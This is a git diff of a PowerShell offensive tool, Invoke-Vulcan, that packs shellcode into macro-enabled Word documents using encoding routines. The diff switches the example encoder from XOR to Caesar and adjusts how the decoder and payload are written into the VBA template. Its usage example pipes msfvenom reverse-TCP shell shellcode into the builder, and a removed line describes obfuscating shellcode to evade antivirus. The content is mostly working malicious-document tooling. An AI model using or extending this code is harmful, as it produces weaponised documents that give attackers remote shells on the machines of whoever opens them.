@@ -5,7 +5,7 @@ function Invoke-Vulcan {
 
         Author: Alexandre Teyar (@aress31)
         License: BSD 3-Clause
-        Required Dependencies: Windows Subsystem for Linux (WSL), BadAssMacros
+        Required Dependencies: Windows Subsystem for Linux (WSL)
         Optional Dependencies: None
 
     .DESCRIPTION
@@ -38,10 +38,9 @@ function Invoke-Vulcan {
   
     .EXAMPLE
         PS C:\>  wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | 
-        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.Visual Basic" -Decoder xor -DecoderPath ".\assets\decoders\xor.Visual Basic -Shift 5
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder caesar -DecoderPath ".\assets\decoders\caesar.vba -Shift 5
 
-        Executes MSFVenom with the specified payload and options, pass the generated hex-formatted shellcode to BadAssMacros to obfuscate it in order to evade AVs,
-        and then removes creates an empty macro-enabled Word document containing the processed macro.
+        Creates a hex-formatted payload then bundle it into an empty macro-enabled Word document using the indirect template along with the Caesar decoder routine.
     #>
 
     [CmdletBinding(PositionalBinding = $False)]
@@ -54,7 +53,7 @@ function Invoke-Vulcan {
         [String]
         $DecoderPath,
 
-        [ValidateRange(-25, 25)]
+        [ValidateRange(0, 255)]
         [int]
         $Shift,
 
@@ -152,9 +151,13 @@ function Create_MacroFromTemplate($Shift, $Decoder, $DecoderPath, $ShellCode, $T
 
     switch ($Decoder) {
         "caesar" {
+            Write-Verbose "[i] Adding the Caesar decoding routine"
+
             Set-Content -Path $MacroOutput -Value (
-                Get-Content -Path $Template).Replace("PAYLOAD", "Array(" + $PayloadArray + ')' + "`r`n" + "`r`n" + "`t" + "kUG(HoR)")
-            Add-Content -Path $MacroOutput -Value ((Get-Content -Path $DecoderPath).Replace("Shift", $Shift))
+                Get-Content -Path $Template).Replace(
+                "PAYLOAD", "Array(" + $PayloadArray + ')' + 
+                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + $Shift)
+            Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
         }
         Default {
             Set-Content -Path $MacroOutput -Value (
